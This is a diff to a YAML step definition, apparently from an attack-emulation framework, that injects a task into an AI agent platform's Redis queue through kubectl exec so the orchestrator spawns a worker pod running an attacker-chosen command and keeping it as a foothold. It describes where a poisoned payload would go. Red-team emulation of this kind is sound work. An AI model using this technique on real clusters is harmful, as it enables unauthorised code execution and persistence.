@@ -1,27 +1,19 @@
 name: Submit Agent Task (spawn worker)
 description: >
-  Push a task onto the agent platform's Redis queue (queue:pending). The
-  orchestrator pops it and creates a fresh agent-worker pod to run it. The task
-  itself is innocuous - just a repo to review - which is the point: the platform
-  did nothing wrong enqueuing it. Re-run to spawn another worker (bounded by the
-  orchestrator's MAX_WORKERS). In the supply-chain variant the repo is spiked,
-  so processing the task is what pops the worker.
-  Driven entirely from the operator/Ran host - no foothold required, only
-  network reach to Redis (a NodePort).
+  Enqueue a task on the agent platform's Redis queue (queue:pending). The
+  orchestrator pops it and creates a fresh agent-worker pod that runs the task's
+  command immediately (a heartbeat by default), then stays alive as a foothold.
+  Re-run to spawn another worker (bounded by the orchestrator's MAX_WORKERS).
+  Driven from the operator/Ran host via the kubeconfig - it execs redis-cli
+  inside the Redis pod, so no node IP or NodePort is needed. The task itself is
+  innocuous; in the supply-chain variant the repo is spiked, so processing it is
+  what pops the worker.
 tactic: Execution
 techniques: ["User Execution", "T1204"]
 parameters:
-  TARGET:
-    type: string
-    default: "${TARGET.IP}"
-    description: >
-      Redis address - a cluster node's IP, reached via its NodePort from the
-      operator host (same as exploit-redis). The Service DNS name is not
-      reachable from outside the cluster.
-  PORT:
-    type: int
-    default: 30679
-    description: the Redis NodePort (maps to 6379 in-cluster)
+  K8S_AUTH:
+    type: K8sAuth
+    description: the Kubernetes identity selected by Authenticate As
   REPO:
     type: string
     default: "https://github.com/Magier/ikt26"
@@ -38,9 +30,10 @@ parameters:
       heartbeat by default; this is where a poisoned task would put its payload.
       Avoid embedded double quotes (it is carried inside a JSON string).
 procedures:
-  - key: redis-cli
+  - key: kubectl
     command: |
-      redis-cli -h ${TARGET} -p ${PORT} LPUSH queue:pending \
+      kubectl ${K8S_AUTH} -n agent-system exec deploy/redis -- \
+        redis-cli LPUSH queue:pending \
         "{\"id\":\"${TASK_ID}\",\"repo\":\"${REPO}\",\"cmd\":\"${CMD}\"}"
     isLocal: true
 preconditions:
